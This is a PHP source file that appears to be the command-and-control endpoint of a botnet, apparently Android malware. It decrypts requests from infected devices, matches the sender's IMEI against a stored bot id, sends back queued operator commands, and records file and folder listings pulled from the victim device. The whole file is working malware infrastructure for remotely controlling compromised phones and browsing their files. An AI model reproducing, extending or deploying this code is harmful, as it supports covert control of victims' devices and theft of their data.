<?php
include 'crypt.php';
include 'config.php';
include 'webSocket.php';

$tuk_tuk = htmlspecialchars($_REQUEST["tuk_tuk"], ENT_QUOTES);

$tuk_tuk = decrypt($tuk_tuk,cryptKey);

$arrayData = explode("|:|",$tuk_tuk);

$imei = isset($arrayData[0]) ? $arrayData[0] : "";
$command = isset($arrayData[1]) ? $arrayData[1] : "";


$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
$connection->exec('SET NAMES utf8');

if($imei!=""){
	$botid = '';
	$statement = $connection->prepare("SELECT botid FROM ws WHERE id='1'");
	$statement->execute();
	foreach($statement as $row){
		$botid = $row['botid'];
		break;
	}

	if($botid != $imei){
		echo encrypt('**noconnection**',cryptKey);
		//echo '**noconnection**';
		return;
	}else{
		$database = new database;
		$strGetCommand = $database->ws_GetCommand();
		$database->ws_UpdateLastConnect(date('Y-m-d H:i'));
		if($strGetCommand !== ''){
			echo encrypt("$strGetCommand",cryptKey);
			//echo "$strGetCommand";
			$database->ws_UpdateCommand('');
		}else{
			echo encrypt('**',cryptKey);
			//echo '**';
		}
	}

	//if(strlen($command) >= 3){ // если запрос c командой!

		if(strpos($command, 'getPath!!!!') !== false){//-------Получаем Путь и файлы/папки-------------
			$database = new database;
			$str = str_replace('getPath!!!!', '', $command);

			$arraySTR = explode("!@@!",$str);

			$path = $arraySTR[0];
			$fileFolder = $arraySTR[1];

			$database->ws_UpdateFileFolder($fileFolder);
			$database->ws_UpdatePath($path);

			$database->ws_UpdateStatusFileFolder('1');
		}elseif(strpos($command, '!!!refreshfilefolder!!!') !== false){
			$database = new database;
			$database->ws_UpdateStatusFileFolder('1');
		}
//	}
}
